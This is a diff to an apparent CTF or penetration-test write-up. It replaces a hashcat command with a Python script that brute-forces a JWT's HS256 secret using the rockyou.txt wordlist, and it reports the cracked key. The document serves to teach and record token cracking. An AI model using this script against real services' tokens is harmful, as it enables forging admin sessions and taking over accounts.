@@ -37,11 +37,37 @@ First, we decoded the JWT structure to understand its components:
 The JWT used HMAC-SHA256 (HS256) for signature verification, which relies on a secret key. We employed a dictionary attack using the following approach:
 
 1. Extracted the header and payload from the JWT
-2. Utilized `hashcat` with the `rockyou.txt` wordlist to brute-force potential keys
-3. Command executed:
-   ```bash
-   hashcat -a 0 -m 16500 "eyJhbGciOiJIUzI1NiJ9.eyJpZCI6MTcsInVzZXJuYW1lIjoiYWRtaW4iLCJjb2RlbmFtZSI6ImFkbWluIiwiaWF0IjoxNzQ2OTQ0Mzk5LCJleHAiOjE3NDcwMzA3OTl9.Meiri0srFara5igrbNl8ibFyeYXqkeemtM3XFNi932Q" rockyou.txt
-   ```
+2. Made a script to bruteforce if the key belongs to rockyou.txt
+
+```python
+──(venv)(shub㉿LAPTOP-O18S4BQL)-[~/work/tools]
+└─$ cat new2.py
+import jwt
+from jwt.exceptions import InvalidSignatureError
+
+# JWT token to crack
+token = "eyJhbGciOiJIUzI1NiJ9.eyJpZCI6MTcsInVzZXJuYW1lIjoiYWRtaW4yIiwiY29kZW5hbWUiOiJhZG1pbjIiLCJpYXQiOjE3NDY5NDc3MDAsImV4cCI6MTc0NzAzNDEwMH0.DcW6n6DJ7uuT_D95gv1iIwpSACMwxfoJ5_j9wnRNtmk"
+
+# Split header and payload
+header = jwt.get_unverified_header(token)
+algo = header['alg']
+
+print(f"[*] Algorithm: {algo}")
+
+with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
+    for line in f:
+        secret = line.strip()
+        try:
+            jwt.decode(token, secret, algorithms=[algo])
+            print(f"[+] Secret found: {secret}")
+            break
+        except InvalidSignatureError:
+            continue
+        except Exception as e:
+            print(f"[-] Error: {e}")
+            continue
+```
+            
 
 **Secret Key Discovery:** `1littlesecret`
 
